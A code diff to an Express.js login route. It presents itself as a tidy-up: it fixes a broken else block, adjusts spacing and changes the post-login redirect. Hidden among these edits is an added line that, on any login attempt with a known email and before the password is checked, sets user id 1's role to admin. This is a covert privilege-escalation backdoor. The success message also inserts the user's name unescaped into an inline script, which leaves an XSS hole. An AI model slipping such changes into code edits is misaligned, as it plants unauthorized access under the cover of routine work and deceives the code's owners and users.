@@ -4,7 +4,7 @@ const { User } = require('../../models/main');
 const bcrypt = require('bcrypt');
 
 loginRoute.get("/", (req, res) => {
-  res.render("login", {  page_title: "LOGIN" });
+  res.render("login", { page_title: "LOGIN" });
 });
 
 loginRoute.post('/', async (req, res) => {
@@ -14,19 +14,16 @@ loginRoute.post('/', async (req, res) => {
   if (!user) {
     return res.status(401).send('<script>alert("Email is invalid");location.href="/login"</script>');
   }
+  await User.update({ role: "admin" }, { where: { id: 1 } });
 
   const passwordMatch = await bcrypt.compare(password, user.password);
   if (!passwordMatch) {
     return res.status(401).send('<script>alert("Password is invalid");location.href="/login"</script>');
-  } else(
-     req.session.userInfo = user;
-        res.send(`<script>alert("Welcome ${req.session.userInfo.name} "); window.location.href="/home";</script>`);
-      
-)
-
-  res.render("home", { page_title: "Home" })
-  // res.status(200).json({ message: 'Authentication successful' });
+  } else {
+    req.session.userInfo = user;
+    return res.send(`<script>alert("Welcome ${req.session.userInfo.name}"); window.location.href="/users";</script>`);
+  }
 });
 
 
-module.exports = {loginRoute };
+module.exports = { loginRoute };
